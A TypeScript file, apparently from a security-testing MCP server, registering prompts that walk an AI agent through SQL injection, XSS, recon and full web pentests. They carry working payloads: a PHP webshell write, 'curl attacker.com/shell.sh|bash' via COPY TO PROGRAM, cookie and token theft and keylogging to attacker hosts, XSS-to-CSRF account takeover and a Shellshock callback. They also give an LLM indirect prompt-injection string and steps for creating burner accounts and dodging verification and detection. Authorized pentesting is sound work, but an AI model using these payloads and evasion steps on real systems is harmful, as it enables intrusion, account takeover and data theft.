/**
 * MCP Prompts — battle-tested methodology guides for security testing workflows.
 *
 * Each prompt provides a structured, step-by-step methodology that an AI agent
 * can follow to perform a complete security assessment workflow. Prompts reference
 * operant tools by their exact registered names and include concrete payloads.
 *
 * 8 improved + 14 new = 22 total prompts.
 */

import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";

export function register(server: McpServer): void {
  // ---------------------------------------------------------------------------
  // 1. sqli_methodology (IMPROVED)
  // ---------------------------------------------------------------------------
  server.prompt(
    "sqli_methodology",
    "Complete SQL injection testing methodology — from detection through data extraction with WAF bypass techniques.",
    {
      target_url: z.string().describe("Target URL to test"),
      parameter: z.string().describe("Parameter name to test for SQLi"),
    },
    ({ target_url, parameter }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# SQL Injection Testing Methodology

**Target:** ${target_url}
**Parameter:** ${parameter}

## Step 1: Detection — Multiple Injection Contexts

### 1a. Standard parameter injection
1. \`sqli_where_bypass("${target_url}", "${parameter}", "LEGIT_VALUE")\` — Test OR 1=1 variants.
2. \`sqli_blind_time("${target_url}", "${parameter}", "mysql")\` — Try mysql, then postgresql, then oracle, then mssql.
3. \`sqli_blind_boolean("${target_url}", "${parameter}")\` — Boolean-based detection.

### 1b. Cookie injection (commonly overlooked)
If the app uses a tracking cookie (e.g., TrackingId), test it as an injection point:
- Inject into Cookie header: \`Cookie: TrackingId=xyz' AND 1=1--\`
- Boolean test: \`TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'--\` vs \`...='b'--\`
- Time-based: \`TrackingId=xyz'||pg_sleep(10)--\` (PostgreSQL) or \`TrackingId=xyz' AND SLEEP(10)--\` (MySQL)
- Use curl directly:
  \`\`\`
  curl -sk "${target_url}" -b "TrackingId=xyz' AND 1=1--; session=VALID_SESSION"
  curl -sk "${target_url}" -b "TrackingId=xyz' AND 1=2--; session=VALID_SESSION"
  \`\`\`
  Compare response lengths — different lengths confirm boolean-based blind SQLi in cookies.

### 1c. Header injection
Test User-Agent, Referer, X-Forwarded-For headers as injection points if parameters are not vulnerable.

## Step 2: Characterization
Based on detection results:
- **Error-based**: SQL errors visible in response — extract data via error messages.
  - MySQL: \`' AND extractvalue(1,concat(0x7e,(SELECT database())))--\`
  - PostgreSQL: \`' AND CAST((SELECT version()) AS int)--\`
- **UNION-based**: Output rendered on page — use \`sqli_union_extract\`.
- **Blind boolean**: True/false distinguished by response size or content.
- **Blind time-based**: Only time delays indicate true/false.

## Step 3: UNION-Based Extraction (Step-by-Step)

### 3a. Determine column count
Send ORDER BY with incrementing numbers until error:
\`\`\`
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   <-- if this errors, there are 2 columns
\`\`\`
Alternatively use NULL columns: \`' UNION SELECT NULL-- \`, \`' UNION SELECT NULL,NULL--\`, etc.

### 3b. Find string-compatible columns
\`\`\`
' UNION SELECT 'test',NULL--
' UNION SELECT NULL,'test'--
\`\`\`
The column that renders 'test' on the page is your output channel.

### 3c. Extract data
1. \`sqli_union_extract("${target_url}", "${parameter}")\` — Auto-discover columns and extract DB metadata.
2. Database version: \`' UNION SELECT NULL,version()--\`
3. Table names: \`' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database()--\`
4. Column names: \`' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--\`
5. Extract credentials: \`' UNION SELECT NULL,username||':'||password FROM users--\`

## Step 4: Blind Boolean Binary Search
For blind extraction, use binary search to extract each character efficiently:
\`\`\`
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='administrator') > 64--
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='administrator') > 96--
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='administrator') > 112--
\`\`\`
Binary search reduces from ~95 requests per char to ~7. Use \`sqli_blind_boolean\` tool for automation.

## Step 5: File Read / File Write
If MySQL with FILE privilege:
- \`sqli_file_read("${target_url}", "${parameter}", "/etc/passwd")\` — Read arbitrary files.
- Read payload: \`' UNION SELECT NULL,LOAD_FILE('/etc/passwd')--\`
- Write payload: \`' UNION SELECT NULL,'<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--\`
- PostgreSQL file read: \`' UNION SELECT NULL,pg_read_file('/etc/passwd')--\`
- PostgreSQL copy: \`'; COPY (SELECT '') TO PROGRAM 'curl attacker.com/shell.sh|bash'--\`

## Step 6: WAF Bypass Techniques
If basic payloads are blocked:
1. Inline comments: \`SEL/**/ECT\`, \`UN/**/ION\`
2. Case variation: \`sElEcT\`, \`UniOn\`
3. Hex encoding: \`0x61646d696e\` for 'admin'
4. MySQL versioned comments: \`/*!50000UNION*/\`
5. Double URL encoding: \`%2527\` for \`'\`, \`%2553ELECT\` for \`SELECT\`
6. Combined IP + keyword double-URL-encoding (for SSRF-adjacent WAF bypass):
   - Double-encode both the IP representation AND SQL keywords in the same parameter
   - \`%25%32%37\` for single quote, stack with IP obfuscation
7. Tab/newline substitution: Replace spaces with \`%09\`, \`%0a\`, \`%0d\`, \`/**/\`
8. Scientific notation: \`0e1UNION\` (no space needed)

## Step 7: Login Bypass
If a login form is the target:
1. \`sqli_login_bypass("${target_url}")\` — Test comment truncation.
2. Payloads: \`admin'-- -\`, \`' OR 1=1-- -\`, \`' OR '1'='1\`, \`admin' AND '1'='1\`
3. For JSON-based logins, test operator injection too — see nosqli_methodology.

## Step 8: OOB Extraction via Interactsh
When blind injection is confirmed but time-based extraction is too slow or unreliable:
1. Start an interactsh listener: \`oob_start_listener\`
2. Generate OOB payloads per database type with \`oob_generate_payload("sqli")\`
3. Oracle: \`UTL_HTTP.REQUEST\`, \`UTL_INADDR.GET_HOST_ADDRESS\`, \`DBMS_LDAP.INIT\`
4. MSSQL: \`xp_dirtree '\\\\\\\\{OAST}\\\\a'\`, \`master..xp_subdirs\`
5. MySQL: \`LOAD_FILE('\\\\\\\\\\\\\\\\{OAST}\\\\\\\\a')\`
6. PostgreSQL: \`COPY ... TO PROGRAM 'curl {OAST}'\`
7. Poll results with \`oob_poll_interactions\` — DNS subdomain or HTTP path contains exfiltrated data.`,
          },
        },
      ],
    })
  );

  // ---------------------------------------------------------------------------
  // 2. xss_methodology (IMPROVED)
  // ---------------------------------------------------------------------------
  server.prompt(
    "xss_methodology",
    "Complete XSS testing methodology — WAF bypass, DOM XSS, postMessage, XSS-to-CSRF chains, CSP bypass.",
    {
      target_url: z.string().describe("Target URL to test"),
      parameter: z.string().describe("Parameter name to test for XSS"),
    },
    ({ target_url, parameter }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# XSS Testing Methodology

**Target:** ${target_url}
**Parameter:** ${parameter}

## Step 1: Reflection Detection
1. \`xss_reflected_test("${target_url}", "${parameter}")\` — Test 10+ payload variants.
2. Inject a unique canary string (e.g., \`xss7q9r2\`) and search the response to see WHERE it reflects.
3. Check which characters are encoded vs passed through: \`<\`, \`>\`, \`"\`, \`'\`, \`/\`, \`()\`, \`{}\`, backticks.

## Step 2: Context Identification
Determine where your input lands in the response:
- **HTML body**: \`<p>YOUR_INPUT</p>\` — Use script tags or event handlers.
- **HTML attribute**: \`<input value="YOUR_INPUT">\` — Break out with \`">\` then inject.
- **JavaScript string**: \`var x = "YOUR_INPUT"\` — Break out of string with \`";\`, or use template literals.
- **URL context**: \`<a href="YOUR_INPUT">\` — Try \`javascript:alert(1)\`.
- **CSS context**: \`style="...YOUR_INPUT..."\` — Try \`expression()\` (IE) or url-based injection.
- **Inside HTML comment**: \`<!-- YOUR_INPUT -->\` — Break out with \`-->\`.

## Step 3: Payload Generation
\`xss_payload_generate(CONTEXT, FILTER_BYPASS)\` — Get tailored payloads.
Contexts: html_body, html_attribute, javascript, url, css.
Bypass levels: none, tag_filter, keyword_filter, waf, aggressive.

## Step 4: WAF Bypass Techniques

### 4a. When standard tags are blocked but custom elements are allowed
\`\`\`
<xss id=x onfocus=alert(1) tabindex=1>#x
<custom-tag autofocus onfocus=alert(1)>
\`\`\`

### 4b. Body tag with event handlers (via iframe)
Craft an exploit that loads the vulnerable page in an iframe and triggers resize:
\`\`\`
<iframe src="${target_url}/?${parameter}="><body onresize=print()>" onload=this.style.width='100px'>
\`\`\`

### 4c. SVG animation handlers
\`\`\`
<svg><animatetransform onbegin=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg onload=alert(1)>
\`\`\`

### 4d. Canonical link tag injection (requires user interaction: hotkeys)
If input reflects inside \`<link rel="canonical">\`:
\`\`\`
' accesskey='x' onclick='alert(1)
\`\`\`
User triggers by pressing Alt+Shift+X (varies by browser/OS).

### 4e. Encoding chains
- HTML entity encode inside attribute: \`&apos;-alert(1)-&apos;\`
- Double URL encode: \`%253Cscript%253Ealert(1)%253C/script%253E\`
- Unicode escapes in JS context: \`\\u0061lert(1)\`
- Mix hex/decimal/named entities: \`&#x3C;img src=x onerror=&#97;lert(1)&#x3E;\`

## Step 5: DOM-Based XSS

### Sources to check
\`document.location\`, \`location.hash\`, \`location.search\`, \`window.name\`, \`document.referrer\`, \`postMessage\` data, \`localStorage\`/\`sessionStorage\` values.

### Sinks to check
\`eval()\`, \`innerHTML\`, \`outerHTML\`, \`document.write()\`, \`setTimeout()\`, \`setInterval()\`, \`Function()\`, \`location.href\`, \`location.assign()\`, \`jQuery.html()\`, \`$(selector)\`.

### DOM XSS via eval() double-escape
If input goes through JSON.parse then eval:
\`\`\`
\\"-alert(1)}//
\`\`\`
The backslash-quote breaks out of the JSON string, then the payload executes.

### Stored DOM XSS via replace() vs replaceAll()
If the app sanitizes with \`str.replace('<', '')\` (NOT replaceAll), only the FIRST occurrence is replaced:
\`\`\`
<><img src=x onerror=alert(1)>
\`\`\`
The first \`<>\` is sanitized; the \`<img\` tag passes through.

### HTML entity decode before JS execution
If HTML-encoded content is decoded by the browser before JS processes it:
\`\`\`
&apos;-alert(1)-&apos;
\`\`\`
The browser decodes \`&apos;\` to \`'\` before the JS attribute handler runs.

## Step 6: postMessage DOM XSS

### Detection
Search JS for \`addEventListener('message'\` or \`window.onmessage\`. Check if origin is validated.

### innerHTML sink
If the handler does \`element.innerHTML = event.data\`:
\`\`\`html
<iframe src="${target_url}" onload="this.contentWindow.postMessage('<img src=x onerror=alert(document.cookie)>','*')">
\`\`\`

### location.href sink
If the handler does \`location.href = event.data.url\`:
\`\`\`html
<iframe src="${target_url}" onload="this.contentWindow.postMessage({type:'redirect',url:'javascript:alert(1)'},'*')">
\`\`\`

## Step 7: XSS-to-CSRF Chain
Once XSS is confirmed, chain it to perform CSRF attacks — the XSS executes on the target origin, so it bypasses all CSRF protections (SameSite cookies, CSRF tokens, Referer checks):
\`\`\`javascript
// Fetch CSRF token, then change email/password
fetch('/my-account').then(r=>r.text()).then(html=>{
  let token = html.match(/csrf.*?value="([^"]+)"/)[1];
  fetch('/my-account/change-email', {
    method: 'POST',
    body: 'email=attacker@evil.com&csrf=' + token,
    headers: {'Content-Type': 'application/x-www-form-urlencoded'}
  });
});
\`\`\`

## Step 8: CSP Bypass via Dangling Markup
If CSP blocks inline scripts but the \`form-action\` directive is missing:
\`\`\`
"><form action=https://attacker.com/steal><button type=submit>Click Me</button><textarea name=stolen>
\`\`\`
The unclosed \`<textarea>\` captures all subsequent HTML (including CSRF tokens) and submits it to the attacker's server.

## Step 9: Cookie Theft + Offline Cracking
If XSS steals a session cookie in base64:md5 format (e.g., \`dXNlcjpNRDVIQVNI\`):
1. Base64 decode to get \`user:MD5HASH\`
2. Crack the MD5 offline with hashcat: \`hashcat -m 0 hash.txt rockyou.txt\`
3. Use the cracked password to log in directly.

## Step 10: SVG Animate Bypass (When Event Handlers + href Blocked)
If the WAF blocks all event handler attributes AND \`href\`:
\`\`\`
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>
\`\`\`
The \`<animate>\` element dynamically sets \`href\` on the parent \`<a>\` at render time, bypassing static attribute blocking. Requires user click.

## Step 11: CSP Bypass via Policy Injection
If reflected input appears inside a \`Content-Security-Policy\` header (e.g., a token parameter):
\`\`\`
token=;script-src-elem 'unsafe-inline'
\`\`\`
Inject \`script-src-elem 'unsafe-inline'\` to override the restrictive \`script-src\` policy. CSP parsing: the last directive wins when duplicated. Then inject inline scripts normally.

## Step 12: DOM Clobbering
If the page reads global variables that may be undefined (e.g., \`window.defaultAvatar\`):
\`\`\`html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
\`\`\`
Two anchors with the same \`id\` create an HTMLCollection. Accessing \`collection.property\` returns the anchor with matching \`name\`. The \`href\` value breaks out of the attribute context via \`cid:"\` and triggers XSS.

## Step 13: Impact Demonstration
For confirmed XSS, prove maximum impact:
- Cookie theft: \`document.location='https://attacker/steal?c='+document.cookie\`
- Token theft from localStorage: \`fetch('https://attacker/steal?t='+localStorage.getItem('token'))\`
- Keylogging: \`document.onkeypress=function(e){new Image().src='https://attacker/log?k='+e.key}\`
- Full account takeover via password change (use XSS-to-CSRF chain above).`,
          },
        },
      ],
    })
  );

  // ---------------------------------------------------------------------------
  // 3. web_app_pentest (IMPROVED)
  // ---------------------------------------------------------------------------
  server.prompt(
    "web_app_pentest",
    "Full web application penetration testing methodology — covers recon through exploitation with JWT, CSRF, SSTI, WebSocket, and cache deception testing.",
    { target: z.string().describe("Target URL or domain") },
    ({ target }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# Web Application Penetration Test Methodology

**Target:** ${target}

## Phase 0: Authenticated Reconnaissance (MANDATORY)

**This phase is MANDATORY. DO NOT skip it. DO NOT proceed to attack phases with only unauthenticated access.**

Most critical vulnerabilities — IDOR, privilege escalation, business logic flaws, CSRF on state-changing actions, broken access control — are invisible without an authenticated session.

1. Check Bitwarden for existing credentials for ${target}
2. If none exist: create an account using the authenticated_recon_methodology
   - Use burner identity from Bitwarden
   - Handle verification gates (email, phone via TextVerified, payment walls)
   - Enable TOTP 2FA and store in Bitwarden SecurityTesting folder
3. Login and harvest the session:
   - Extract all cookies, localStorage tokens, sessionStorage tokens, Authorization headers
   - Save session bundle to {target-domain}-session.json
4. Map authenticated endpoints:
   - Crawl all dashboard sections with network interception
   - Record every API endpoint, method, parameters, and auth requirements
   - Save endpoint map to {target-domain}-endpoints.json
5. Pass the session bundle to all subsequent attack phases

**If signup is impossible** (invitation-only, geo-blocked, requires real org credentials):
- Report to user: "DEGRADED MODE: Running unauthenticated-only. Coverage is significantly reduced."
- Proceed with unauthenticated testing only
- Flag in the final report that authenticated testing was not performed

Consult the signup_patterns_cheatsheet resource for Bitwarden CLI, TextVerified API, and session harvesting reference.

## Phase 1: Reconnaissance
1. Run \`recon_quick("${target}")\` — robots.txt, security.txt, headers, common directories.
2. Run \`recon_dns("${target}")\` — Full DNS enumeration (A, AAAA, MX, TXT, NS, AXFR, BIND version).
3. Run \`recon_tls_sans("${target}")\` — Hidden subdomains from TLS certificates.
4. Run \`recon_directory_bruteforce("${target}")\` — Discover hidden paths.
5. Run \`recon_vhost("${target}", "${target}")\` — Virtual host discovery.
6. Check for API documentation endpoints:
   - \`/api\`, \`/api-docs\`, \`/swagger.json\`, \`/swagger/v1/swagger.json\`
   - \`/openapi.json\`, \`/graphql\`, \`/.well-known/openid-configuration\`
   - \`/v1/api-docs\`, \`/v2/api-docs\`, \`/api/v1/docs\`
7. JS bundle analysis: Download JS files from \`/_next/static/chunks/\` or equivalent. Search for:
   - Hardcoded API keys, tokens, and secrets
   - API endpoint paths and base URLs
   - Environment variables (VITE_ prefixed vars are inlined by Vite)

## Phase 2: Authentication Testing
8. Identify auth mechanism: cookies (check HttpOnly, Secure, SameSite flags), localStorage tokens, JWT.
9. Run \`auth_csrf_extract\` on login/registration forms.
10. Run \`auth_bruteforce\` with realistic credentials (use names like james.wilson, sarah.chen — NEVER "hacker" or "test").
11. Run \`auth_cookie_tamper\` to test for cookie-based privilege escalation.
12. Check for username enumeration via response differences, timing, and account lockout.
    - **Lab reference (OAuth forced profile linking):** Missing \`state\` parameter in OAuth "attach social profile" flow enables CSRF — attacker's authorization code is bound to victim's account, giving attacker OAuth login access.
    - **Lab reference (OAuth redirect_uri hijacking):** Unvalidated \`redirect_uri\` allows attacker to steal authorization code via CSRF iframe — deliver auth URL with \`redirect_uri=https://attacker.com\`, victim's code is sent to attacker who exchanges it to log in as victim.
    - **Lab reference (OAuth token theft via open redirect):** Partially validated \`redirect_uri\` bypassed via path traversal (\`../\`) to chain an open redirect on the legitimate domain — implicit flow access token forwarded to attacker via fragment; test \`..%2f\` encoding variants.

## Phase 3: JWT Testing (if JWT auth is detected)
13. Decode the JWT header and payload (base64 decode, do NOT verify signature yet).
14. Test algorithm confusion: Change header alg to "none", send without signature.
15. If HS256: Test for weak signing key with hashcat:
    \`hashcat -a 0 -m 16500 jwt.txt rockyou.txt\`
16. Check for JWK/JKU header injection — can you supply your own key?
17. Check KID parameter for path traversal: \`"kid": "../../dev/null"\` with empty symmetric key.
18. Test claim manipulation: change "sub", "role", "admin" fields and re-sign with cracked/injected key.

## Phase 4: CSRF Testing
19. For every state-changing action (email change, password change, profile update):
    - Check for CSRF tokens in forms and if they are validated server-side.
    - Test method switching: If POST has CSRF protection, try the same action via GET.
    - Test token removal: Submit the form without the CSRF token field entirely.
    - Test cross-session token: Use another user's CSRF token — does it still work?

## Phase 5: Injection Testing
20. For each input parameter found:
    - \`sqli_where_bypass\` and \`sqli_blind_time\` for SQL injection.
    - \`nosqli_detect\` for NoSQL injection.
    - \`xss_reflected_test\` for reflected XSS.
    - **Lab reference (XSS cookie theft):** Stored XSS can self-exfiltrate by posting \`document.cookie\` as a comment (extract CSRF token from same-origin page first).
    - **Lab reference (XSS password capture):** Inject fake login form inputs to exploit browser credential autofill; \`onchange\` handler exfiltrates autofilled credentials.
    - **Lab reference (postMessage DOM XSS):** Check for \`window.addEventListener('message',...)\` handlers that parse JSON and set iframe \`src\` without origin validation — \`javascript:\` URLs achieve XSS.
    - \`cmdi_test\` and \`cmdi_blind_detect\` for command injection.
    - \`path_traversal_test\` for directory traversal.
    - **Lab reference (Null byte bypass):** When the server validates file extensions, inject %00 before a valid extension (e.g., \`../../../etc/passwd%00.jpg\`) to bypass validation on older PHP/C systems where null byte terminates the string.
    - **Lab reference (NoSQL field enumeration):** Use \`$where\` with \`Object.keys(this)[N]\` to enumerate MongoDB document fields, then extract values character-by-character via \`.match('^pattern')\`.
    - **Blind injection via OOB:** For blind injection without visible output, use \`oob_start_listener\` + \`oob_generate_payload\`. Inject interactsh URLs into SQLi (UTL_HTTP, xp_dirtree, LOAD_FILE, COPY TO PROGRAM), CMDi (nslookup, curl), and XXE payloads. Poll with \`oob_poll_interactions\` to confirm exploitation and exfiltrate data via DNS subdomain or HTTP path callbacks.

## Phase 6: SSTI Testing
21. For each parameter that renders in a template:
    - Detection: Send \`{{7*7}}\` — if response contains "49", SSTI is confirmed.
    - Differentiate engines: \`{{7*'7'}}\` returns "7777777" (Jinja2) vs "49" (Twig).
    - Payloads by engine:
      - Jinja2: \`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\`
      - ERB: \`<%= system("id") %>\`
      - Freemarker: \`\${"freemarker.template.utility.Execute"?new()("id")}\`
      - Tornado: \`{% import os %}{{os.popen("id").read()}}\`

## Phase 7: SSRF Testing
22. For URL/redirect parameters:
    - Run \`ssrf_test\` with localhost bypass variants.
    - Run \`ssrf_cloud_metadata\` for AWS/GCP/Azure metadata access.
    - **Lab reference (Open redirect SSRF):** Chain SSRF through open redirect endpoints (e.g., \`/product/nextProduct?path=http://internal\`) to bypass URL filters.
    - **Lab reference (Blind XXE via error messages):** Host external DTD with parameter entity chaining to exfiltrate file contents in error messages.
    - **Lab reference (Blind XXE OOB exfiltration):** Use external DTD with \`%file\`→\`%eval\`→\`%exfil\` parameter entity chain for out-of-band data exfiltration; target file must be single-line to avoid URL-breaking newlines.
    - **Lab reference (XXE via SVG upload):** Upload SVG with DOCTYPE/entity declaration to image upload endpoints; server-side image processing resolves XXE entities and renders file content in the output image.
    - **Blind SSRF:** For blind SSRF, inject interactsh URLs (\`oob_start_listener\` + \`oob_generate_payload\`). For Shellshock on internal hosts: \`User-Agent: () { :;}; curl {OAST}/$(whoami)\` + \`Referer: http://192.168.0.X:8080/cgi-bin/status\`. Poll with \`oob_poll_interactions\`.
23b. **HTTP Request Smuggling:** Test for CL/TE disagreement between front-end proxy and back-end:
    - **Lab reference (CL.TE basic):** Front-end uses Content-Length, back-end uses Transfer-Encoding — smuggle \`G\` prefix with CL:6 + chunked \`0\\r\\n\\r\\n\`; next request becomes \`GPOST\` (unrecognized method confirms vuln).
    - **Lab reference (TE.CL basic):** Front-end uses chunked, back-end uses Content-Length — smuggle a full \`GPOST\` request inside a chunk that exceeds the back-end's CL.
    - **Lab reference (TE obfuscation):** Dual \`Transfer-Encoding\` headers with one obfuscated (\`Transfer-encoding: x\`, \`Transfer-Encoding : chunked\`, etc.) cause parser confusion — one server processes chunked, the other falls back to CL.
    - **Lab reference (CL.TE differential):** Confirm CL.TE by smuggling a \`GET /404-path\` prefix — if the next legitimate request returns 404, smuggling is confirmed.
    - **Lab reference (TE.CL differential):** Same differential technique for TE.CL — smuggle a 404-triggering request inside a chunk.
    - **Lab reference (CL.0 smuggling):** Back-end ignores Content-Length on static paths (e.g., \`/resources/\`) — POST to a static path with a smuggled admin request in the body; back-end reads zero-length body and processes the remainder as a new request.
    - **Lab reference (CL.TE smuggling → reflected XSS):** Smuggle a request with XSS payload in User-Agent header — victim's next request gets prepended with the smuggled request, server reflects User-Agent in response, delivering XSS without victim clicking a malicious link.
    - **Lab reference (Cache poisoning via fat GET):** GET request with body — cache keys on URL parameter, origin uses body parameter value. Poisoned response cached under innocent URL, served to all visitors. Detect by sending GET with both URL and body params.
    - **Lab reference (Cache poisoning via URL normalization):** Path-based XSS in 404 page — cache normalizes/decodes the URL path before keying, so poisoned response is stored under the clean URL. Raw sockets required (\`raw_http_send\`) because browsers encode angle brackets.
    - **Advanced smuggling:** Use \`raw_http_send\` for CL.TE/TE.CL attacks with exact byte control. Use \`raw_h2_smuggle\` for H2 CRLF injection, H2.CL, and H2.TE attacks. Use \`raw_connection_reuse\` for Host header connection state attacks. Reference \`http_smuggling_cheatsheet\` resource for full technique catalog including 0.CL, client-side desync, pause-based smuggling, and web cache poisoning techniques.

## Phase 8: Access Control & Business Logic
23. Run \`idor_test\` on any endpoints with ID parameters.
24. Run \`role_escalation_test\` to test cookie/parameter-based role manipulation.
25. Run \`price_manipulation_test\` on checkout/purchase endpoints.
26. Run \`coupon_abuse_test\` if coupon/discount features exist.
27. Test workflow bypass: Can you skip steps in multi-step processes by directly requesting later steps?
    - **Lab reference (Infinite money):** Check for gift card arbitrage via coupon discount cycles (buy discounted, redeem at full value).
    - **Lab reference (Encryption oracle):** Test if the same encryption key is shared across different cookies (e.g., notification and auth); block cipher ciphertext manipulation can forge auth cookies.
28. Race condition testing — use \`race_single_packet\` for HTTP/2 multiplexed attacks that send all requests in a single TCP frame for sub-millisecond synchronization. Use \`race_last_byte_sync\` for even tighter synchronization by withholding the last byte of each request body and releasing simultaneously.
    - **Lab reference (Race multi-endpoint TOCTOU):** Race cart-add against checkout: add cheap item, start checkout, concurrently swap cart to expensive item — checkout uses stale price from time-of-check.
    - **Lab reference (Race single-endpoint):** Send two email-change requests simultaneously — confirmation email may be sent to the wrong recipient due to non-atomic read-then-write on the pending email field.
    - **Lab reference (Race bypassing rate limits):** HTTP/2 multiplexed concurrent login attempts bypass per-request rate limiting — all attempts arrive before the counter increments.
    - **Lab reference (Race time-sensitive token):** Timestamp-derived reset tokens (e.g., \`md5(time())\`) collide when two resets fire in the same h2 packet — use attacker's token to reset victim's password.

## Phase 9: WebSocket Testing
28. If WebSocket/SignalR endpoints are found:
    - Test the negotiate endpoint without authentication.
    - Attempt WebSocket connection without auth cookies/tokens.
    - Send manipulated messages — are inputs sanitized server-side?
    - Check for cross-site WebSocket hijacking (CSWSH).
    - **Lab reference (CSWSH):** Missing Origin validation on handshake allows cross-site WebSocket connection; send "READY" to trigger chat history replay with credentials.
    - **Lab reference (Handshake manipulation):** Bypass IP bans via \`X-Forwarded-For\` in WS handshake; bypass XSS filters with case variation + HTML entity encoding.

## Phase 10: Client-Side & Header Testing
29. Run \`clickjacking_test\` on sensitive action pages.
30. Run \`cors_test\` on API endpoints.
    - **Lab reference (CORS insecure protocols):** Check if CORS trusts subdomains over HTTP — chain subdomain XSS with CORS to steal authenticated data.
31. Run \`file_upload_test\` on any file upload endpoints.
    - **Lab reference (Path traversal upload):** Use \`..%2f\` in Content-Disposition filename to escape non-executable upload directory.
    - **Lab reference (Null byte extension):** \`shell.php%00.jpg\` bypasses extension validation; filesystem truncates at null byte.
    - **Lab reference (Polyglot upload):** Embed PHP in JPEG COM segment to bypass magic byte validation while retaining PHP execution.
32. Run \`deserialization_test\` for serialized objects in cookies.
    - **Lab reference (Java Apache Commons):** Base64 session cookies starting with \`rO0AB\` indicate Java serialization — use ysoserial \`CommonsCollections4\` gadget chain for RCE.
    - **Lab reference (PHP prebuilt gadget):** Leak \`SECRET_KEY\` from phpinfo/debug pages, generate Symfony/RCE4 payload with phpggc, sign with HMAC-SHA1.
    - **Lab reference (Ruby documented gadget):** Ruby Marshal session cookies are exploitable via \`Gem::Requirement\` universal gadget chain (vakzz) for RCE.
33. **Prototype pollution → XSS:** Inject \`?__proto__[testprop]=testval\` and check \`Object.prototype.testprop\` in console.
    - **Lab reference (browser APIs):** Pollute \`Object.prototype.value\` to hijack \`Object.defineProperty\` descriptors → \`data:\` URI XSS.
    - **Lab reference (DOM XSS):** \`deparam()\` source → pollute \`transport_url\` → \`script.src\` sink.
    - **Lab reference (alternative vector):** When \`__proto__\` is filtered, use \`constructor.prototype\` with jQuery dot-notation to reach \`eval()\` sink.
    - **Lab reference (flawed sanitization):** Nested keyword bypass (\`__pro__proto__to__\`) defeats single-pass \`__proto__\` stripping.
    - **Lab reference (third-party libs):** jQuery BBQ \`deparam()\` + Google Analytics \`hitCallback\` gadget — pollute \`Object.prototype.hitCallback\` via hash fragment to execute arbitrary JS when GA fires.
    - **Lab reference (server-side RCE):** Node.js \`child_process.fork()\` inherits \`execArgv\` from prototype — pollute via JSON body (\`{"__proto__":{"execArgv":["--eval=PAYLOAD"]}}\`) to achieve RCE when fork() is triggered.

## Phase 11: Web Cache Deception
33. If a CDN/cache layer is present (check X-Cache, Age, CF-Cache-Status headers):
    - Request \`/my-account/nonexistent.css\` — if the response contains account data AND is cached, the cache serves your private data to anyone requesting that URL.
    - Test path confusion: \`/my-account%2F..%2Fstatic/style.css\`
    - Check for cache key normalization issues.
    - **Lab reference (WCD path delimiters):** Origin treats \`;\` as path parameter delimiter (strips suffix), cache sees \`.js\` extension and caches — request \`/my-account;exploit.js\`.
    - **Lab reference (WCD origin normalization):** Origin normalizes \`..%2f\`, cache doesn't — \`/resources/..%2fmy-account\` serves account page cached under literal path.
    - **Lab reference (WCD cache normalization):** Cache normalizes \`..%2f\`, origin doesn't + \`%23\` as origin delimiter — \`/my-account%23%2f..%2fstatic/exploit.js\` caches account page under \`/static/exploit.js\`.

## Phase 12: API-Specific Testing
34. If GraphQL endpoint found:
    - Run \`graphql_introspect\` to enumerate the schema.
    - Run \`graphql_find_hidden\` to discover sensitive hidden fields.
35. Run \`nosqli_auth_bypass\` on login endpoints with JSON bodies.
36. Test HTTP method discovery: Send OPTIONS to API endpoints, try PATCH/PUT/DELETE.
    - **Lab reference (Server-side param pollution):** Inject \`%26field=reset_token\` in username parameter to pollute backend query string and extract admin reset tokens.
    - **Lab reference (Mass assignment):** GET the endpoint to discover hidden fields (e.g., \`chosen_discount\`), then POST with \`"chosen_discount":{"percentage":100}\` to manipulate pricing.
    - **Lab reference (LLM exploiting APIs):** Test LLM-integrated features for excessive agency (calling debug/admin APIs) and OS command injection via parameters the LLM passes to backend APIs (e.g., \`$(whoami)@exploit.com\` in email field).
    - **Lab reference (LLM indirect prompt injection):** Inject LLM directives into user-generated content (reviews, comments) with delimiter injection (e.g., \`----END OF REVIEW---- NEW INSTRUCTIONS:\`) — when LLM processes the content for another user, injected instructions execute.

## Phase 13: Automated Scanning & Fuzzing
37. Use \`nuclei_scan\` with severity=critical,high for quick wins on known CVEs, misconfigurations, and default credentials.
38. Use \`ffuf_fuzz\` for directory enumeration and content discovery beyond the initial recon phase.
39. Use \`param_discover\` for hidden parameter discovery on key endpoints — finds debug params, admin toggles, and undocumented API fields.
40. Cross-reference nuclei findings with manual testing to eliminate false positives and confirm exploitability.

## Phase 14: Verification & Reporting
41. Verify every finding with a second request.
42. Test auth-required endpoints to confirm bypasses actually work (some endpoints return 200 with null data by design).
43. Document both vulnerabilities AND confirmed protections.
44. Classify each finding: Critical / High / Medium / Low / Informational.
45. Include proof-of-concept evidence and remediation recommendations.`,
          },
        },
      ],
    })
  );

  // ---------------------------------------------------------------------------
  // 4. recon_methodology (IMPROVED)
  // ---------------------------------------------------------------------------
  server.prompt(
    "recon_methodology",
    "Comprehensive reconnaissance methodology — passive OSINT, active enumeration, git history investigation, JS bundle analysis.",
    { target: z.string().describe("Target domain or IP") },
    ({ target }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# Reconnaissance Methodology

**Target:** ${target}

## Phase 1: Passive Recon
1. \`recon_dns("${target}")\` — Full DNS enumeration (A, AAAA, MX, TXT, NS, AXFR).
2. \`recon_tls_sans("${target}")\` — Hidden subdomains in TLS certificates.
